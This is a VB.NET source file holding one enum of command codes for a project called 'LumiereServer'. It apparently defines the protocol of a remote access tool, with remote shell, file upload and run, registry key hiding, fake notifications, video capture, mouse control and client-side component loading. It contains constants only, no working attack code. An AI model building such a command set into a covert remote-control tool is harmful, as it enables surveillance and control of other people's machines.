' ***********************************************************************
' Assembly         : LumiereServer
' Author           : rezni
' Created          : 06-12-2020
'
' Last Modified By : rezni
' Last Modified On : 06-11-2020
' ***********************************************************************
' <copyright file="MDataTypes.vb" company="LumiereSombre | HorizonDova">
'     Copyright ©  LumiereSombre Inc. 2020
' </copyright>
' <summary>Holds types of operations that is supported at the momment by the server</summary>
' ***********************************************************************
''' <summary>
''' Holds types of operations that is supported at the momment by the server.
''' </summary>
Public Module MDataTypes
    ''' <summary>
    ''' Enum dataTypes
    ''' </summary>
    Public Enum dataTypes
        ''' <summary>
        ''' Send ping
        ''' </summary>
        ping_send = 1
        ''' <summary>
        ''' Ping aknowledged
        ''' </summary>
        ping_aknowledged = 2
        ''' <summary>
        ''' Close client
        ''' </summary>
        close_client = 3
        ''' <summary>
        ''' Fake notification
        ''' </summary>
        fake_notification = 4
        ''' <summary>
        ''' Authentificate operation
        ''' </summary>
        authentificate = 5
        ''' <summary>
        ''' Request shell command
        ''' </summary>
        shell = 6
        ''' <summary>
        ''' Abort any pending operation
        ''' </summary>
        abort = 7

        '' FTP TRANSACTION COMMANDS 
        ''' <summary>
        ''' Enumerate drives
        ''' </summary>
        enum_drives = 8
        ''' <summary>
        ''' Enumerate folders and files
        ''' </summary>
        enum_folders_and_files = 9
        ''' <summary>
        ''' Download file
        ''' </summary>
        download_file = 10
        ''' <summary>
        ''' Download folder
        ''' </summary>
        download_folder = 11
        ''' <summary>
        ''' Delete folder
        ''' </summary>
        delete_folder = 12
        ''' <summary>
        ''' Delete file
        ''' </summary>
        delete_file = 13
        ''' <summary>
        ''' Rename
        ''' </summary>
        rename = 14
        ''' <summary>
        ''' Create folder
        ''' </summary>
        create_folder = 15
        ''' <summary>
        ''' Create file
        ''' </summary>
        create_file = 16
        ''' <summary>
        ''' Upload file
        ''' </summary>
        upload_file = 17
        ''' <summary>
        ''' Run file
        ''' </summary>
        run = 18

        ''' <summary>
        ''' Low level error debugging
        ''' </summary>
        tcp_error_debugging = 19
        ''' <summary>
        ''' Low level comunication error debugging
        ''' </summary>
        com_error_debugging = 20

        ''' <summary>
        ''' Video stream config
        ''' </summary>
        video_frame = 21
        ''' <summary>
        ''' Force load specific component
        ''' </summary>
        load_component = 22
        ''' <summary>
        ''' Cancel operation
        ''' </summary>
        flags_cancel_operation = 23
        ''' <summary>
        ''' Start video stream
        ''' </summary>
        video_start = 24


        '' REGEDIT TRANSASCTION
        ''' <summary>
        ''' Enum regedit keys
        ''' </summary>
        enum_keys = 25
        ''' <summary>
        ''' Enum regedit values
        ''' </summary>
        enum_values = 26
        ''' <summary>
        ''' Rename regedit key
        ''' </summary>
        rename_key = 27
        ''' <summary>
        ''' Delete regedit key
        ''' </summary>
        delete_key = 28
        ''' <summary>
        ''' Hide regedit key
        ''' </summary>
        hide_key = 29
        ''' <summary>
        ''' Create regedit key
        ''' </summary>
        create_key = 30
        ''' <summary>
        ''' The create value
        ''' </summary>
        create_value = 31

        ''' <summary>
        ''' Video end stream
        ''' </summary>
        video_end = 32
        ''' <summary>
        ''' Free component
        ''' </summary>
        free_component = 33     ' Calls FreeLibraryAndExitThread on client side

        ''' <summary>
        ''' Mouse start tagging
        ''' </summary>
        mouse_start = 34
        ''' <summary>
        ''' Mouse position
        ''' </summary>
        mouse_pos = 35
        ''' <summary>
        ''' Mouse click left
        ''' </summary>
        mouse_click_left = 36
        ''' <summary>
        ''' Mouse click right
        ''' </summary>
        mouse_click_right = 37

    End Enum


End Module
